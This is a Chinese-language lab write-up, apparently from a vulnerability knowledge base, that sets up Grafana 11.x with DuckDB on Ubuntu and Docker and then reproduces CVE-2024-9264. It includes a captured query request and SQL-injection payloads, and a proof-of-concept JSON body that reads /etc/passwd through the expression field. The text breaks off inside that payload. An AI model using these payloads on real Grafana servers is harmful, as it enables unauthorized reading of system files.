        <content type="html"><![CDATA[<h1 id="一、Grafana基础"><a href="#一、Grafana基础" class="headerlink" title="一、Grafana基础"></a>一、Grafana基础</h1><h2 id="1-1-Grafana是什么？"><a href="#1-1-Grafana是什么？" class="headerlink" title="1.1 Grafana是什么？"></a>1.1 Grafana是什么？</h2><p>Grafana是一款开源的数据可视化和监控平台，它允许用户通过创建动态仪表板来监视和分析数据。</p><p>以下是Grafana的一些主要特点和功能：</p><ol><li><strong>多数据源支持</strong>：Grafana支持多种数据源，包括但不限于Graphite、Prometheus、Elasticsearch、InfluxDB等，可以从多种数据源中收集数据，并在同一仪表板中进行统一展示。</li><li><strong>丰富的可视化选项</strong>：提供了各种图表类型、样式和配置选项，用户可以根据需求定制图表。</li><li><strong>告警功能</strong>：支持设置警报规则，并在达到特定条件时发送通知。</li><li><strong>插件生态系统</strong>：拥有丰富的插件生态系统，用户可以根据需要扩展和定制功能。</li><li><strong>社区支持</strong>：拥有活跃的开发社区，提供了丰富的文档、教程和支持资源。</li><li><strong>跨平台性</strong>：Grafana是一个跨平台的开源的分析和可视化工具，可以通过将采集的数据查询然后可视化的展示，并及时通知。</li><li><strong>图表与可视化</strong>：Grafana具有快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式，让复杂的数据展示的美观而优雅。</li><li><strong>实际应用场景广泛</strong>：Grafana广泛应用于IT基础设施监控、业务数据分析与可视化、实时数据仪表板构建等领域。</li><li><strong>版本更新</strong>：Grafana 10.0版本在2023年6月发布，带来了许多新功能和改进，如更新的Panel面板、Dashboard、导航栏以及Grafana Altering等。</li></ol><p>Grafana以其强大的功能和灵活性，成为了数据可视化和监控领域的重要工具，适用于各种规模的项目和不同的监控需求。</p><h2 id="1-2-安装部署（本地部署）"><a href="#1-2-安装部署（本地部署）" class="headerlink" title="1.2 安装部署（本地部署）"></a>1.2 安装部署（本地部署）</h2><p>在Ubuntu上安装指定版本的Grafana，你可以按照以下步骤操作：</p><p>下面是我所使用的ubuntu系统信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ubuntu <span class="token number">22.04</span>.3 LTS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2014.00.27.png" alt="系统信息" style="zoom:40%;"><h3 id="1-2-1-更新系统软件包"><a href="#1-2-1-更新系统软件包" class="headerlink" title="1.2.1 更新系统软件包"></a>1.2.1 <strong>更新系统软件包</strong></h3><p>更新你的Ubuntu系统以确保所有软件包和依赖项是最新的。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo apt updatesudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>sudo apt update</code> 和 <code>sudo apt upgrade</code> 是在基于 Debian 的 Linux 发行版（如 Ubuntu）中使用的命令，它们用于管理和更新系统软件包。下面是这两个命令的详细解释：</p><h3 id="sudo-apt-update"><a href="#sudo-apt-update" class="headerlink" title="sudo apt update"></a>sudo apt update</h3><ul><li><code>sudo</code>：这是一个命令行实用程序，允许授权的用户以另一个用户的安全权限执行命令，默认情况下是以超级用户（root）的权限执行。</li><li><code>apt</code>：是“Advanced Package Tool”的缩写，它是 Debian 及其衍生版（如 Ubuntu）的软件包管理工具。</li><li><code>update</code>：这是 <code>apt</code> 工具的一个命令，用于从源服务器同步软件包索引文件。这个命令不会更改任何已安装的软件包，它只是更新本地数据库，使其与软件源中的最新软件包信息保持一致。</li></ul><p>执行 <code>sudo apt update</code> 时，系统会从每个启用的软件源（在 <code>/etc/apt/sources.list</code> 和 <code>/etc/apt/sources.list.d/</code> 下的文件中定义）获取最新的软件包列表。这个操作是安装、升级或移除软件包之前的重要步骤，因为它确保了你拥有最新的软件包信息。</p><h3 id="sudo-apt-upgrade"><a href="#sudo-apt-upgrade" class="headerlink" title="sudo apt upgrade"></a>sudo apt upgrade</h3><ul><li><code>upgrade</code>：这是 <code>apt</code> 的另一个命令，用于升级所有可升级的软件包至最新版本。</li></ul><p>执行 <code>sudo apt upgrade</code> 时，系统会查找所有已安装的软件包，如果有可用的更新（这些信息是通过 <code>sudo apt update</code> 获得的），则将它们升级到最新版本。这个命令会处理依赖关系，确保在升级过程中所需的依赖项也会被安装或升级。</p></blockquote><h3 id="1-2-2-访问官网"><a href="#1-2-2-访问官网" class="headerlink" title="1.2.2 访问官网"></a>1.2.2 访问官网</h3><p><a href="https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1">https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.30.28.png" alt="grafana官网" style="zoom:50%;"><p>【选择特定的版本，CVE-2024-9264被评为9.9的CVSS评分，影响Grafana 11.0.x、11.1.x和11.2.x版本。】</p><p>这里我选择的是11.1.0版本的，后续按照官方提示操作即可。</p><h3 id="1-2-3-安装grafana"><a href="#1-2-3-安装grafana" class="headerlink" title="1.2.3 安装grafana"></a>1.2.3 安装grafana</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> adduser libfontconfig1 musl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>bug处理</li></ul><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.34.52.png" alt="bug" style="zoom:50%;"><p>错误解释：</p><ul><li><code>E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 27625 (unattended-upgr)</code>：这个错误表明 <code>apt-get</code> 无法获取 <code>/var/lib/dpkg/lock-frontend</code> 这个锁文件，因为它正被进程号为 27625 的进程（<code>unattended-upgr</code>，即无人值守升级进程）占用。</li><li><code>N: Be aware that removing the lock file is not a solution and may break your system.</code>：这是一个警告，提醒用户不要简单地删除锁文件，因为这可能会破坏系统。</li><li><code>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</code>：这个错误再次强调无法获取 dpkg 前端锁，询问是否有其他进程正在使用它。</li></ul><p>这个错误通常发生在系统正在进行另一个软件包管理操作，比如另一个 <code>apt-get</code> 命令或者系统更新正在运行。解决这个问题的方法通常是等待当前的软件包管理操作完成，或者如果确定没有其他操作在进行，可以检查是否有僵尸进程占用了锁文件。</p><p>如果需要强制终止占用锁文件的进程，可以使用以下命令（请谨慎使用，因为这可能会导致系统不稳定）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">27625</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再次尝试运行你的 <code>apt-get</code> 命令。如果你不确定，最好先检查系统是否有正在运行的更新或软件包管理操作。</p></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.38.52-3722748.png" alt="依赖安装" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.47.36.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>dpkg</code>：是 Debian 包管理器的命令行工具，用于安装、构建、拆除和检查 Debian 软件包。</li><li><code>-i</code>：这是 <code>dpkg</code> 命令的一个选项，代表 <code>--install</code>，用于安装本地的 Debian 软件包。</li></ul></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.51.52.png" alt="截屏2024-12-09 13.51.52" style="zoom:50%;"><h3 id="1-2-4-启动服务"><a href="#1-2-4-启动服务" class="headerlink" title="1.2.4 启动服务"></a>1.2.4 启动服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl start grafana-server或systemctl start grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2-5-查看启动状态"><a href="#1-2-5-查看启动状态" class="headerlink" title="1.2.5 查看启动状态"></a>1.2.5 查看启动状态</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl status grafana-server或systemctl status grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.55.03.png" alt="截屏2024-12-09 13.55.03" style="zoom:50%;"><h3 id="1-2-6-访问服务"><a href="#1-2-6-访问服务" class="headerlink" title="1.2.6 访问服务"></a>1.2.6 访问服务</h3><p>浏览器输入IP:3000进行登录<br>        默认用户密码：admin/admin</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.57.27.png" alt="本机测试" style="zoom:40%;"><p>【本机测试，访问成功！】</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.58.24.png" alt="局域网测试" style="zoom:30%;"><p>【局域网测试，访问成功！】</p><p>第一次登录之后会强制修改密码（毕竟admin/admin太弱了）。</p><h2 id="1-3-Docker部署"><a href="#1-3-Docker部署" class="headerlink" title="1.3 Docker部署"></a>1.3 Docker部署</h2><ul><li>下面提供另外一种Docker部署的方法供参考：</li></ul><p>使用 Grafana 11.0.0 构建环境，安装  <code>duckdb</code> 二进制文件并将其添加到 Grafana 的 <code>$PATH</code> 中。</p><p>下载 <a href="https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip">duckdb_cli-linux-amd64.zip</a>，与 Dockerfile、docker-compose.yml 放置在同一目录。</p><p>Dockerfile</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> grafana/grafana:11.0.0-ubuntu</span><span class="token instruction"><span class="token keyword">USER</span> root</span><span class="token comment"># Install DuckDB</span><span class="token instruction"><span class="token keyword">COPY</span> duckdb_cli-linux-amd64.zip /tmp/</span><span class="token instruction"><span class="token keyword">RUN</span> apt-get update &amp;&amp; apt-get install -y &amp;&amp; apt-get install unzip -y</span>    &amp;&amp; unzip /tmp/duckdb_cli-linux-amd64.zip -d /usr/local/bin/ \    &amp;&amp; chmod +x /usr/local/bin/duckdb \    &amp;&amp; rm /tmp/duckdb_cli-linux-amd64.zip<span class="token comment"># Add DuckDB to the PATH</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token string">"/usr/local/bin:${PATH}"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=rootpassword      <span class="token punctuation">-</span> MYSQL_DATABASE=grafanadb      <span class="token punctuation">-</span> MYSQL_USER=grafana      <span class="token punctuation">-</span> MYSQL_PASSWORD=grafanapassword    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./mysql<span class="token punctuation">-</span>data<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">healthcheck</span><span class="token punctuation">:</span>      <span class="token key atrule">test</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"CMD"</span><span class="token punctuation">,</span> <span class="token string">"mysqladmin"</span><span class="token punctuation">,</span> <span class="token string">"ping"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span>      <span class="token key atrule">interval</span><span class="token punctuation">:</span> 10s      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 5s      <span class="token key atrule">retries</span><span class="token punctuation">:</span> <span class="token number">3</span>    <span class="token key atrule">grafana</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3000:3000"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> GF_SECURITY_ADMIN_PASSWORD=abc123<span class="token tag">!</span>      <span class="token punctuation">-</span> GF_DATABASE_TYPE=mysql      <span class="token punctuation">-</span> GF_DATABASE_HOST=mysql<span class="token punctuation">:</span><span class="token number">3306</span>      <span class="token punctuation">-</span> GF_DATABASE_USER=grafana      <span class="token punctuation">-</span> GF_DATABASE_PASSWORD=grafanapassword      <span class="token punctuation">-</span> GF_DATABASE_NAME=grafanadb    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> grafana<span class="token punctuation">-</span>storage<span class="token punctuation">:</span>/var/lib/grafana      <span class="token punctuation">-</span> ./grafana.ini<span class="token punctuation">:</span>/etc/grafana/grafana.ini    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>        <span class="token key atrule">mysql</span><span class="token punctuation">:</span>         <span class="token key atrule">condition</span><span class="token punctuation">:</span> service_healthy  <span class="token key atrule">volumes</span><span class="token punctuation">:</span>  <span class="token key atrule">grafana-storage</span><span class="token punctuation">:</span>  mysql<span class="token punctuation">-</span>storage<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前目录执行如下命令，启动一个 Grafana 11.0.0 环境：</p><pre class="line-numbers language-none"><code class="language-none">docker build -t grafana:11.0.0 .docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>环境启动后，访问 <code>http://your-ip:3000</code> 即可查看到管理后台。由于配置了密码，需要使用 <code>admin/abc123!</code> 登录管理后台。</p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><h2 id="2-1-漏洞概述"><a href="#2-1-漏洞概述" class="headerlink" title="2.1 漏洞概述"></a>2.1 漏洞概述</h2><p>Grafana 的一个实验性 SQL 表达式功能中存在一个 DuckDB SQL 注入漏洞。</p><p>任何<strong>经过身份验证</strong>的用户都可以通过修改 Grafana 仪表板中的表达式执行任意 DuckDB SQL 查询。</p><blockquote><p>什么是DuckDB？</p><p>DuckDB是一个轻量级、嵌入式的SQL OLAP数据库管理系统，旨在提供高性能的数据分析。它支持标准SQL，允许在应用程序内部处理数据，无需外部数据库服务器。DuckDB优化了内存使用，通过列存储和数据压缩技术，提高了数据访问速度和查询效率。此外，它还具备跨平台兼容性，支持Windows、Linux和macOS，使得开发者可以在多种操作系统上部署和使用。DuckDB的开源特性也使其易于扩展和定制，满足特定需求。</p></blockquote><p>利用条件：</p><ol><li><p>有账号密码，可以登陆. </p></li><li><p>服务器安装了duckDB.（默认没安装）</p></li><li><p>使用有漏洞的版本.</p></li></ol><h2 id="2-2-漏洞位置"><a href="#2-2-漏洞位置" class="headerlink" title="2.2 漏洞位置"></a>2.2 漏洞位置</h2><p>漏洞点在仪表盘创建处。这里可以输入表达式，执行一些函数命令。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2011.30.43.png" style="zoom:50%;"><h2 id="2-3-抓包分析"><a href="#2-3-抓包分析" class="headerlink" title="2.3 抓包分析"></a>2.3 抓包分析</h2><p>在Expression处输入内容test并回车，BP抓到的请求包内容如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /api/ds/query?ds_type<span class="token operator">=</span>__expr__<span class="token operator">&amp;</span><span class="token assign-left variable">expression</span><span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">requestId</span><span class="token operator">=</span>Q102 HTTP/1.1Host: <span class="token number">192.168</span>.155.31:3000User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X <span class="token number">10.15</span><span class="token punctuation">;</span> rv:134.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/134.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateReferer: http://192.168.155.31:3000/dashboard/new?orgId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">editPanel</span><span class="token operator">=</span><span class="token number">1</span>content-type: application/jsonx-datasource-uid: grafanax-grafana-device-id: 619ca89a5f27e3a3f1bd260aead26594x-grafana-from-expr: <span class="token boolean">true</span>x-grafana-org-id: <span class="token number">1</span>x-panel-id: <span class="token number">1</span>x-panel-plugin-id: timeseriesx-plugin-id: datasourceContent-Length: <span class="token number">350</span>Origin: http://192.168.155.31:3000Connection: closeCookie: <span class="token assign-left variable">grafana_session</span><span class="token operator">=</span>86e5a674ff2f29d015081887dbebfa42<span class="token punctuation">;</span> <span class="token assign-left variable">grafana_session_expiry</span><span class="token operator">=</span><span class="token number">1734931671</span>Priority: <span class="token assign-left variable">u</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">{</span><span class="token string">"queries"</span><span class="token builtin class-name">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"queryType"</span><span class="token builtin class-name">:</span><span class="token string">"randomWalk"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"grafana"</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"datasource"</span><span class="token punctuation">}</span>,<span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>,<span class="token string">"datasourceId"</span>:-1,<span class="token string">"intervalMs"</span>:20000,<span class="token string">"maxDataPoints"</span>:1059<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"B"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"Expression"</span><span class="token punctuation">}</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"math"</span>,<span class="token string">"hide"</span>:false,<span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"test<span class="token entity" title="\n">\n</span>"</span>,<span class="token string">"window"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"from"</span><span class="token builtin class-name">:</span><span class="token string">"1734909521360"</span>,<span class="token string">"to"</span><span class="token builtin class-name">:</span><span class="token string">"1734931121360"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>响应内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">500</span> Internal Server ErrorCache-Control: no-storeContent-Type: application/jsonX-Content-Type-Options: nosniffX-Frame-Options: denyX-Xss-Protection: <span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">mode</span><span class="token operator">=</span>blockDate: Mon, <span class="token number">23</span> Dec <span class="token number">2024</span> 05:19:14 GMTContent-Length: <span class="token number">43</span>Connection: close<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Query data error"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2013.19.30.png" alt="截屏2024-12-23 13.19.30"></p><h2 id="2-4-漏洞初步测试"><a href="#2-4-漏洞初步测试" class="headerlink" title="2.4 漏洞初步测试"></a>2.4 漏洞初步测试</h2><p>修改expression参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"SELECT * FROM read_blob('/etc/passwd');<span class="token entity" title="\n">\n</span>"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Data source not found"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并没有获得预期的/etc/passwd的内容。</p><p>尝试其他方法也不行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据提示，缺乏相应的数据源。</p><h2 id="2-5-安装DuckDB"><a href="#2-5-安装DuckDB" class="headerlink" title="2.5 安装DuckDB"></a>2.5 安装DuckDB</h2><p>需要特别注意⚠️：</p><ul><li><p>该漏洞是真对DuckDB的sql注入，所以利用条件除了安装grafana之外，还需要安装duckDB，后续创建仪表盘的时候选择DuckDB数据源。</p></li><li><p><code>duckdb</code> 二进制文件必须存在于 Grafana 的 <code>$PATH</code> 中，此攻击才能成功；默认情况下，此二进制文件未安装在 Grafana 发行版中。</p></li></ul><h3 id="2-5-1-下载安装包"><a href="#2-5-1-下载安装包" class="headerlink" title="2.5.1 下载安装包"></a>2.5.1 下载安装包</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip<span class="token function">unzip</span> duckdb_cli-linux-amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.23.46.png" alt="截屏2024-12-23 14.23.46"></p><p>解压之后即可运行。</p><h3 id="2-5-2-解压使用"><a href="#2-5-2-解压使用" class="headerlink" title="2.5.2 解压使用"></a>2.5.2 解压使用</h3><p>执行./duckdb即可进入数据库。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.02.png" style="zoom:50%;"><p>执行如下命令即可查看本地文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SELECT * FROM read_csv_auto<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.48.png" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.28.07.png" style="zoom:50%;"><p>能够查询到本地的敏感文件。</p><p>所以如果grafana的表达式如果未经过滤直接交给duckDB执行，就会存在读区敏感文件的风险。</p><h3 id="2-5-3-直接安装到-usr-local-bin-并设置PATH环境变量"><a href="#2-5-3-直接安装到-usr-local-bin-并设置PATH环境变量" class="headerlink" title="2.5.3 直接安装到/usr/local/bin/ 并设置PATH环境变量"></a>2.5.3 直接安装到/usr/local/bin/ 并设置PATH环境变量</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">unzip</span> /tmp/duckdb_cli-linux-amd64.zip <span class="token parameter variable">-d</span> /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.32.15.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span> sxk@sxk-ubuntu22:~/Desktop$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/sxk/anaconda3/bin:/home/sxk/anaconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/usr/local/bin已经在PATH中了，如果不在需要按照如下方法设置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过修改profile文件:<span class="token function">vim</span> /etc/profile<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:<span class="token environment constant">$PATH</span>生效方法：系统重启有效期限：永久有效用户局限：对所有用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-6-POC测试，成功读取到-etc-passwd的数据"><a href="#2-6-POC测试，成功读取到-etc-passwd的数据" class="headerlink" title="2.6 POC测试，成功读取到/etc/passwd的数据"></a>2.6 POC测试，成功读取到/etc/passwd的数据</h2><p>抓包之后，用下面的POC替换POST数据。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"from"</span><span class="token builtin class-name">:</span> <span class="token string">"1696154400000"</span>,  <span class="token string">"to"</span><span class="token builtin class-name">:</span> <span class="token string">"1696345200000"</span>,  <span class="token string">"queries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      <span class="token string">"datasource"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Expression"</span>,        <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>,        <span class="token string">"uid"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>      <span class="token punctuation">}</span>,      <span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,      <span class="token string">"hide"</span><span class="token builtin class-name">:</span> false,      <span class="token 